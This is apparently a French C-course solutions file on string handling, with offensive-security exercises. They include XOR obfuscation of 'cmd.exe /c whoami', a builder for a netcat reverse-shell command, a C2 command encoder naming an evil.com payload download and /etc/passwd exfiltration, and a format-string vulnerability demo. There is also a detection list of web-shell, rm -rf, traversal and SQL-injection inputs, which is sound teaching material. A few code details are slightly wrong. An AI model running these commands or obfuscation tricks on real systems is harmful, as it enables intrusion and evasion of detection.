# Solutions - Module 08 : Strings (Chaînes de caractères)

## Solution Exercice 1 : Manipulation de base

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char text[] = "Offensive Security";

    // 1. Affiche la string
    printf("[*] String: %s\n", text);

    // 2. Longueur avec strlen
    printf("[*] Longueur (strlen): %zu caractères\n", strlen(text));

    // 3. sizeof vs strlen
    printf("[*] Taille (sizeof): %zu bytes\n", sizeof(text));
    printf("    Note: sizeof inclut le '\\0' terminal\n\n");

    // 4. Caractère par caractère
    printf("[*] Détail:\n");
    for (int i = 0; text[i] != '\0'; i++) {
        printf("    [%2d] '%c' = 0x%02X (%d)\n",
               i, text[i], (unsigned char)text[i], text[i]);
    }

    return 0;
}
```

**Points clés** :
- `strlen()` retourne le nombre de caractères SANS le '\0'
- `sizeof()` retourne la taille totale du tableau AVEC le '\0'

---

## Solution Exercice 2 : Copie et concaténation

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char src[] = "Payload";
    char dst[50];
    char prefix[50] = "Encoded_";
    char small[5];

    // 1. strcpy
    strcpy(dst, src);
    printf("[*] strcpy: dst = '%s'\n", dst);

    // 2. strncpy avec buffer trop petit
    strncpy(small, src, sizeof(small) - 1);
    small[sizeof(small) - 1] = '\0';  // IMPORTANT!
    printf("[*] strncpy (tronqué): small = '%s'\n", small);

    // 3. strcat
    strcat(prefix, src);
    printf("[*] strcat: prefix = '%s'\n", prefix);

    return 0;
}
```

**Attention** : `strncpy` ne garantit PAS le '\0' final si la source est plus longue que n !

---

## Solution Exercice 3 : Comparaison de strings

```c
#include <stdio.h>
#include <string.h>
#include <ctype.h>

// Comparaison case-insensitive
int strcasecmp_custom(const char *s1, const char *s2) {
    while (*s1 && *s2) {
        int diff = tolower((unsigned char)*s1) - tolower((unsigned char)*s2);
        if (diff != 0) return diff;
        s1++;
        s2++;
    }
    return tolower((unsigned char)*s1) - tolower((unsigned char)*s2);
}

int main(void) {
    char password_db[] = "admin123";
    char attempts[][20] = {"admin", "admin123", "Admin123", "ADMIN123"};
    int num_attempts = 4;

    printf("[*] Password authentication test:\n\n");

    for (int i = 0; i < num_attempts; i++) {
        int result = strcmp(password_db, attempts[i]);

        printf("Attempt: '%s'\n", attempts[i]);

        if (result == 0) {
            printf("  [+] CORRECT (strcmp = 0)\n");
        } else {
            printf("  [-] INCORRECT (strcmp = %d)\n", result);
        }

        // Bonus: case-insensitive
        if (strcasecmp_custom(password_db, attempts[i]) == 0) {
            printf("  [~] Would match case-insensitive\n");
        }
        printf("\n");
    }

    printf("[*] Note: 'Admin123' != 'admin123' car strcmp compare les\n");
    printf("    valeurs ASCII: 'A'(65) vs 'a'(97)\n");

    return 0;
}
```

---

## Solution Exercice 4 : Recherche dans les strings

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char url[] = "https://admin:password123@target.com:8080/admin/login?user=root";

    printf("[*] URL: %s\n\n", url);

    // 1. Trouve le premier ':'
    char *colon = strchr(url, ':');
    printf("[*] Premier ':' à l'index %ld\n", colon - url);

    // 2. Trouve '@'
    char *at = strchr(url, '@');
    if (at) {
        printf("[*] '@' trouvé à l'index %ld\n", at - url);
    }

    // 3. Cherche "admin"
    char *admin = strstr(url, "admin");
    if (admin) {
        printf("[*] 'admin' trouvé à l'index %ld\n", admin - url);
    }

    // 4. Cherche "/login"
    char *login = strstr(url, "/login");
    if (login) {
        printf("[*] '/login' trouvé à l'index %ld\n", login - url);
    }

    // 5. Extraction complète
    printf("\n[*] Parsing URL:\n");

    // Copie de travail
    char work[256];
    strcpy(work, url);

    // Protocole
    char *proto_end = strstr(work, "://");
    if (proto_end) {
        *proto_end = '\0';
        printf("    Protocol: %s\n", work);

        char *rest = proto_end + 3;

        // Credentials
        char *at_sign = strchr(rest, '@');
        if (at_sign) {
            *at_sign = '\0';
            char *pass_start = strchr(rest, ':');
            if (pass_start) {
                *pass_start = '\0';
                printf("    Username: %s\n", rest);
                printf("    Password: %s\n", pass_start + 1);
            }
            rest = at_sign + 1;
        }

        // Host:port
        char *path_start = strchr(rest, '/');
        if (path_start) {
            *path_start = '\0';

            char *port_start = strchr(rest, ':');
            if (port_start) {
                *port_start = '\0';
                printf("    Host: %s\n", rest);
                printf("    Port: %s\n", port_start + 1);
            } else {
                printf("    Host: %s\n", rest);
            }

            printf("    Path: /%s\n", path_start + 1);
        }
    }

    return 0;
}
```

---

## Solution Exercice 5 : ROT13 encoder

```c
#include <stdio.h>
#include <string.h>

void rot13(char *str) {
    for (int i = 0; str[i] != '\0'; i++) {
        char c = str[i];

        if (c >= 'a' && c <= 'z') {
            str[i] = ((c - 'a' + 13) % 26) + 'a';
        } else if (c >= 'A' && c <= 'Z') {
            str[i] = ((c - 'A' + 13) % 26) + 'A';
        }
        // Autres caractères inchangés
    }
}

int main(void) {
    char message[] = "Attack at midnight";

    printf("[*] Original: %s\n", message);

    // Encode
    rot13(message);
    printf("[*] Encoded:  %s\n", message);

    // Decode (ROT13 est sa propre inverse)
    rot13(message);
    printf("[*] Decoded:  %s\n", message);

    return 0;
}
```

**Note** : ROT13 appliqué deux fois redonne l'original car 13+13=26.

---

## Solution Exercice 6 : XOR string encoder

```c
#include <stdio.h>
#include <string.h>

void xor_encode(unsigned char *data, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void print_hex(unsigned char *data, int len) {
    for (int i = 0; i < len; i++) {
        printf("%02X ", data[i]);
    }
    printf("\n");
}

void print_c_array(unsigned char *data, int len) {
    printf("unsigned char encoded[] = {");
    for (int i = 0; i < len; i++) {
        if (i % 8 == 0) printf("\n    ");
        printf("0x%02X", data[i]);
        if (i < len - 1) printf(", ");
    }
    printf("\n};\n");
}

int main(void) {
    char secret[] = "C2_SERVER_192.168.1.100";
    int len = strlen(secret);
    unsigned char key = 0x42;

    // Sauvegarde
    char original[50];
    strcpy(original, secret);

    printf("[*] Original: %s\n", secret);
    printf("[*] Key: 0x%02X\n\n", key);

    // Encode
    xor_encode((unsigned char*)secret, len, key);

    printf("[*] Encoded (hex): ");
    print_hex((unsigned char*)secret, len);

    printf("\n[*] Code C:\n");
    print_c_array((unsigned char*)secret, len);

    // Decode
    xor_encode((unsigned char*)secret, len, key);

    printf("\n[*] Decoded: %s\n", secret);

    // Vérification
    if (strcmp(secret, original) == 0) {
        printf("[+] Verification OK!\n");
    }

    return 0;
}
```

---

## Solution Exercice 7 : String obfuscation

```c
#include <stdio.h>
#include <string.h>

void xor_decode(unsigned char *data, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main(void) {
    // Strings encodées avec XOR 0x55
    // "cmd.exe" XOR 0x55:
    // 'c'^0x55=0x36, 'm'^0x55=0x38, 'd'^0x55=0x31,
    // '.'^0x55=0x7B, 'e'^0x55=0x30, 'x'^0x55=0x2D, 'e'^0x55=0x30
    unsigned char enc_cmd[] = {0x36, 0x38, 0x31, 0x7B, 0x30, 0x2D, 0x30, 0x00};

    // "/c whoami" XOR 0x55:
    unsigned char enc_arg[] = {0x7A, 0x36, 0x75, 0x22, 0x3D, 0x3A, 0x36, 0x38, 0x3C, 0x00};

    unsigned char key = 0x55;

    printf("[*] Obfuscated strings in binary:\n");
    printf("    (not visible with 'strings' command)\n\n");

    printf("[*] Encoded cmd: ");
    for (int i = 0; enc_cmd[i] != 0; i++) {
        printf("%02X ", enc_cmd[i]);
    }
    printf("\n");

    printf("[*] Encoded arg: ");
    for (int i = 0; enc_arg[i] != 0; i++) {
        printf("%02X ", enc_arg[i]);
    }
    printf("\n\n");

    // Décode à l'exécution
    xor_decode(enc_cmd, strlen((char*)enc_cmd), key);
    xor_decode(enc_arg, strlen((char*)enc_arg), key);

    printf("[*] Decoded at runtime:\n");
    printf("    cmd: %s\n", enc_cmd);
    printf("    arg: %s\n", enc_arg);

    return 0;
}
```

**Application** : Les strings sensibles ne sont plus visibles avec `strings binary`.

---

## Solution Exercice 8 : Parser HTTP request

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char request[] = "POST /api/login HTTP/1.1\r\n"
                     "Host: target.com\r\n"
                     "Content-Type: application/json\r\n"
                     "Content-Length: 45\r\n"
                     "\r\n"
                     "{\"username\":\"admin\",\"password\":\"secret\"}";

    char work[1024];
    strcpy(work, request);

    printf("[*] Parsing HTTP Request:\n\n");

    // Première ligne
    char *line = strtok(work, "\r\n");
    if (line) {
        char *method = strtok(line, " ");
        char *path = strtok(NULL, " ");
        char *version = strtok(NULL, " ");

        printf("[*] Request Line:\n");
        printf("    Method:  %s\n", method);
        printf("    Path:    %s\n", path);
        printf("    Version: %s\n\n", version);
    }

    // Headers
    printf("[*] Headers:\n");
    char *header;
    char *body_start = NULL;

    while ((header = strtok(NULL, "\r\n")) != NULL) {
        if (strlen(header) == 0) {
            // Empty line = end of headers
            body_start = strtok(NULL, "");
            break;
        }

        // Parse header
        char *colon = strchr(header, ':');
        if (colon) {
            *colon = '\0';
            printf("    %s: %s\n", header, colon + 2);

            if (strcmp(header, "Host") == 0) {
                // Déjà affiché
            }
        }
    }

    // Body
    printf("\n[*] Body:\n");
    // Retrouve le body dans l'original
    char *body = strstr(request, "\r\n\r\n");
    if (body) {
        printf("    %s\n", body + 4);
    }

    return 0;
}
```

---

## Solution Exercice 9 : Validation d'input

```c
#include <stdio.h>
#include <string.h>

const char *dangerous[] = {
    "<?php", "<%", "$(", "`", "&&", "||", ";",
    "../", "..\\", "<script", "javascript:",
    "SELECT", "INSERT", "DELETE", "DROP", "UNION"
};
int num_dangerous = 15;

const char* check_input(const char *input) {
    for (int i = 0; i < num_dangerous; i++) {
        if (strstr(input, dangerous[i]) != NULL) {
            return dangerous[i];
        }
    }
    return NULL;
}

int main(void) {
    char inputs[][100] = {
        "Hello World",
        "<?php system($_GET['cmd']); ?>",
        "; rm -rf /",
        "../../../etc/passwd",
        "'; DROP TABLE users; --",
        "Normal text here",
        "<script>alert('XSS')</script>"
    };
    int num_inputs = 7;

    int dangerous_count = 0;

    printf("[*] Input Validation Scanner\n");
    printf("════════════════════════════════════════\n\n");

    for (int i = 0; i < num_inputs; i++) {
        const char *pattern = check_input(inputs[i]);

        printf("Input: \"%s\"\n", inputs[i]);

        if (pattern) {
            printf("  [DANGEROUS] Pattern found: '%s'\n\n", pattern);
            dangerous_count++;
        } else {
            printf("  [SAFE]\n\n");
        }
    }

    printf("════════════════════════════════════════\n");
    printf("[*] Summary:\n");
    printf("    Total: %d\n", num_inputs);
    printf("    Safe: %d\n", num_inputs - dangerous_count);
    printf("    Dangerous: %d\n", dangerous_count);

    return 0;
}
```

---

## Solution Exercice 10 : Base64 simple

```c
#include <stdio.h>
#include <string.h>

const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void base64_encode(const unsigned char *input, int len, char *output) {
    int i, j;

    for (i = 0, j = 0; i < len; i += 3, j += 4) {
        unsigned int val = input[i] << 16;

        if (i + 1 < len) val |= input[i + 1] << 8;
        if (i + 2 < len) val |= input[i + 2];

        output[j] = base64_table[(val >> 18) & 0x3F];
        output[j + 1] = base64_table[(val >> 12) & 0x3F];
        output[j + 2] = (i + 1 < len) ? base64_table[(val >> 6) & 0x3F] : '=';
        output[j + 3] = (i + 2 < len) ? base64_table[val & 0x3F] : '=';
    }

    output[j] = '\0';
}

int main(void) {
    // Tests
    struct {
        char *input;
        char *expected;
    } tests[] = {
        {"Man", "TWFu"},
        {"Hello", "SGVsbG8="},
        {"Attack", "QXR0YWNr"}
    };

    char encoded[100];

    printf("[*] Base64 Encoder\n\n");

    for (int i = 0; i < 3; i++) {
        base64_encode((unsigned char*)tests[i].input,
                     strlen(tests[i].input), encoded);

        printf("Input:    %s\n", tests[i].input);
        printf("Expected: %s\n", tests[i].expected);
        printf("Got:      %s\n", encoded);
        printf("Match:    %s\n\n",
               strcmp(encoded, tests[i].expected) == 0 ? "YES" : "NO");
    }

    return 0;
}
```

---

## Solution Exercice 11 : Format string exploitation

```c
#include <stdio.h>
#include <string.h>

void vulnerable_log(char *message) {
    printf(message);  // VULNÉRABLE!
    printf("\n");
}

void safe_log(char *message) {
    printf("%s\n", message);  // SÉCURISÉ
}

int main(void) {
    int secret = 0xDEADBEEF;

    printf("[*] Format String Vulnerability Demo\n");
    printf("[*] Adresse de secret: %p\n", (void*)&secret);
    printf("[*] Valeur de secret: 0x%X\n\n", secret);

    // Test 1: Normal
    printf("[TEST 1] Input normal:\n");
    printf("  vulnerable_log(\"Hello World\"):\n    ");
    vulnerable_log("Hello World");

    printf("  safe_log(\"Hello World\"):\n    ");
    safe_log("Hello World");
    printf("\n");

    // Test 2: Format specifiers
    printf("[TEST 2] Input avec format specifiers:\n");
    printf("  vulnerable_log(\"%%x %%x %%x %%x\"):\n    ");
    vulnerable_log("%x %x %x %x");
    printf("  ^ Fuite de données de la stack!\n\n");

    printf("  safe_log(\"%%x %%x %%x %%x\"):\n    ");
    safe_log("%x %x %x %x");
    printf("  ^ Affiche littéralement la string\n\n");

    // Explication
    printf("[*] EXPLICATION:\n");
    printf("    vulnerable_log() passe l'input directement à printf()\n");
    printf("    printf() interprète %%x comme 'affiche un int en hex'\n");
    printf("    Il lit les valeurs sur la stack → FUITE DE MÉMOIRE\n\n");

    printf("[*] DANGER:\n");
    printf("    - %%x : Lire la mémoire\n");
    printf("    - %%s : Lire une string (crash possible)\n");
    printf("    - %%n : ÉCRIRE en mémoire!\n");

    return 0;
}
```

**Vulnérabilité** : `printf(user_input)` permet de lire ET écrire en mémoire!

---

## Solution Exercice 12 : Shellcode string builder

```c
#include <stdio.h>
#include <string.h>

int main(void) {
    char target_ip[] = "192.168.1.100";
    int target_port = 4444;

    char command[256];

    // Construction sécurisée avec snprintf
    int written = snprintf(command, sizeof(command),
                          "nc %s %d -e /bin/sh",
                          target_ip, target_port);

    // Vérifie si le buffer est assez grand
    if (written >= (int)sizeof(command)) {
        printf("[-] Buffer overflow prevented!\n");
        return 1;
    }

    printf("[*] Command Builder\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Command: %s\n", command);
    printf("[*] Length: %d bytes\n", written);
    printf("[*] Buffer: %zu bytes\n", sizeof(command));
    printf("[*] Safe: %s\n", written < (int)sizeof(command) ? "YES" : "NO");

    return 0;
}
```

---

## Solution Exercice 13 : Password generator

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

int has_lowercase(const char *s) {
    for (int i = 0; s[i]; i++)
        if (s[i] >= 'a' && s[i] <= 'z') return 1;
    return 0;
}

int has_uppercase(const char *s) {
    for (int i = 0; s[i]; i++)
        if (s[i] >= 'A' && s[i] <= 'Z') return 1;
    return 0;
}

int has_digit(const char *s) {
    for (int i = 0; s[i]; i++)
        if (s[i] >= '0' && s[i] <= '9') return 1;
    return 0;
}

int has_special(const char *s, const char *special) {
    for (int i = 0; s[i]; i++)
        if (strchr(special, s[i])) return 1;
    return 0;
}

int main(void) {
    char lowercase[] = "abcdefghijklmnopqrstuvwxyz";
    char uppercase[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    char digits[] = "0123456789";
    char special[] = "!@#$%^&*()_+-=[]{}|;:,.<>?";

    char all_chars[100] = {0};
    char password[17] = {0};

    srand(time(NULL));

    // Combine tous les charsets
    strcpy(all_chars, lowercase);
    strcat(all_chars, uppercase);
    strcat(all_chars, digits);
    strcat(all_chars, special);

    int all_len = strlen(all_chars);

    printf("[*] Password Generator\n\n");

    // Génère jusqu'à avoir un mot de passe valide
    int attempts = 0;
    do {
        attempts++;

        for (int i = 0; i < 16; i++) {
            password[i] = all_chars[rand() % all_len];
        }
        password[16] = '\0';

    } while (!(has_lowercase(password) &&
               has_uppercase(password) &&
               has_digit(password) &&
               has_special(password, special)));

    printf("[*] Generated password: %s\n", password);
    printf("[*] Length: %zu\n", strlen(password));
    printf("[*] Attempts: %d\n\n", attempts);

    printf("[*] Validation:\n");
    printf("    Has lowercase: %s\n", has_lowercase(password) ? "YES" : "NO");
    printf("    Has uppercase: %s\n", has_uppercase(password) ? "YES" : "NO");
    printf("    Has digit:     %s\n", has_digit(password) ? "YES" : "NO");
    printf("    Has special:   %s\n", has_special(password, special) ? "YES" : "NO");

    return 0;
}
```

---

## Solution Exercice 14 : C2 command encoder

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef struct {
    int id;
    char command[100];
    char args[200];
} C2Command;

void xor_encode(char *data, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void print_hex(unsigned char *data, int len) {
    for (int i = 0; i < len; i++) {
        printf("%02X", data[i]);
    }
}

int main(void) {
    C2Command cmds[] = {
        {1, "whoami", ""},
        {2, "download", "http://evil.com/payload.exe"},
        {3, "execute", "calc.exe"},
        {4, "screenshot", "desktop.png"},
        {5, "exfil", "/etc/passwd"}
    };
    int num_cmds = sizeof(cmds) / sizeof(cmds[0]);
    unsigned char key = 0xAA;

    printf("[*] C2 Command Encoder\n");
    printf("════════════════════════════════════════\n\n");

    for (int i = 0; i < num_cmds; i++) {
        // Format: ID|COMMAND|ARGS
        char packet[512];
        snprintf(packet, sizeof(packet), "%d|%s|%s",
                cmds[i].id, cmds[i].command, cmds[i].args);

        int len = strlen(packet);

        printf("[CMD %d] Original: %s\n", cmds[i].id, packet);

        // Encode
        xor_encode(packet, len, key);
        printf("        Encoded:  ");
        print_hex((unsigned char*)packet, len);
        printf("\n");

        // Decode et vérifie
        xor_encode(packet, len, key);
        printf("        Decoded:  %s\n", packet);

        // Parse
        char *id_str = strtok(packet, "|");
        char *cmd = strtok(NULL, "|");
        char *args = strtok(NULL, "|");

        printf("        Parsed:   ID=%s CMD=%s ARGS=%s\n\n",
               id_str, cmd, args ? args : "(none)");
    }

    return 0;
}
```

---

## Récapitulatif des patterns offensifs

| Pattern | Fonction | Application |
|---------|----------|-------------|
| XOR encoding | Obfuscation | Cacher des strings |
| ROT13 | Obfuscation simple | Évasion basique |
| Base64 | Encodage | Transport de données |
| Format string | Exploitation | Lecture/écriture mémoire |
| Input validation | Défense | Détection d'injection |
| String parsing | Analyse | Parser des protocoles |
| snprintf | Sécurité | Éviter les overflows |

---

## Points clés à retenir

1. **Toujours terminer par '\0'** : Sans null terminator, comportement indéfini
2. **Utiliser strncpy/snprintf** : Limite les copies pour éviter les overflows
3. **strcmp pour comparer** : Jamais `==` pour les strings
4. **printf("%s", input)** : Jamais `printf(input)` - format string vuln!
5. **Obfuscation XOR** : Simple mais efficace pour cacher des strings
6. **Validation** : Toujours valider les inputs utilisateur

Les strings sont une source majeure de vulnérabilités en C. Maîtriser leur manipulation est essentiel pour l'exploitation et la défense.
